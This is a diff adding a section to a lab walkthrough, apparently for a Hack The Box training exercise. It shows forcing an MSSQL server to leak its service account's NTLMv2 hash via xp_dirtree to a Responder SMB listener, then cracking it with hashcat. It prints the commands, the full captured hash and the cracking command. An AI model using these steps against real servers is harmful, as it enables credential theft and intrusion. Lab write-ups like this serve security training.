@@ -660,3 +660,134 @@ Password:
 SQL (htbdbuser  guest@master)> 
 ```
 
+As the current user, htbdbuser, I can't access the flagDB database
+```
+SQL (htbdbuser  guest@master)> SELECT name FROM master.dbo.sysdatabases
+name      
+-------   
+master    
+
+tempdb    
+
+model     
+
+msdb      
+
+hmaildb   
+
+flagDB    
+
+SQL (htbdbuser  guest@master)> SELECT table_name FROM master.INFORMATION_SCHEMA.TABLES
+table_name         
+----------------   
+spt_fallback_db    
+
+spt_fallback_dev   
+
+spt_fallback_usg   
+
+spt_values         
+
+spt_monitor        
+
+SQL (htbdbuser  guest@master)> USE flagDB
+[-] ERROR(WIN-02\SQLEXPRESS): Line 1: The server principal "htbdbuser" is not able to access the database "flagDB" under the current security context.
+SQL (htbdbuser  guest@master)> 
+```
+
+Reviewing the lesson again; I need to steal the password hash of the user. First, fire up *responder*. Responder **MUST** be running for this to work.
+1. Responder
+```
+sudo responder -I tun1
+```
+
+2. We're XP_SUBDIRS Hash Stealing with impacket. Log into the MSSQL database and execute one of the undocumented procedures. It uses the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.
+```
+SQL (htbdbuser  guest@master)> EXEC master..xp_dirtree '\\10.10.16.43\share\'
+subdirectory   depth   
+------------   -----   
+SQL (htbdbuser  guest@master)> 
+```
+
+3. View the captured hash in the Responder terminal
+```
+└─$ sudo responder -I tun1
+[sudo] password for dan: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun1]
+    Responder IP               [10.10.16.43]
+    Responder IPv6             [dead:beef:4::1029]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-AZ4FSPDLS2X]
+    Responder Domain Name      [KUXO.LOCAL]
+    Responder DCE-RPC Port     [48181]
+
+[+] Listening for events...                                                                                                                                                                   
+
+[SMB] NTLMv2-SSP Client   : 10.129.203.12
+[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
+[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:f18f16677bf13c85:7F2AC4AC5C6A706A4DBA38DF4AA324ED:0101000000000000006BF4EEF430DA015A7E8D7F01EE577100000000020008004B00550058004F0001001E00570049004E002D0041005A00340046005300500044004C0053003200580004003400570049004E002D0041005A00340046005300500044004C005300320058002E004B00550058004F002E004C004F00430041004C00030014004B00550058004F002E004C004F00430041004C00050014004B00550058004F002E004C004F00430041004C0007000800006BF4EEF430DA0106000400020000000800300030000000000000000000000000300000F117544626ACDA1CC12CA017F556B393B09BE679BD5C5CC053F2488A55A497F10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00340033000000000000000000  
+```
+
+
+Put the hash in a text file and now use hashcat to crack it, using the rockyou.txt file
+```
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
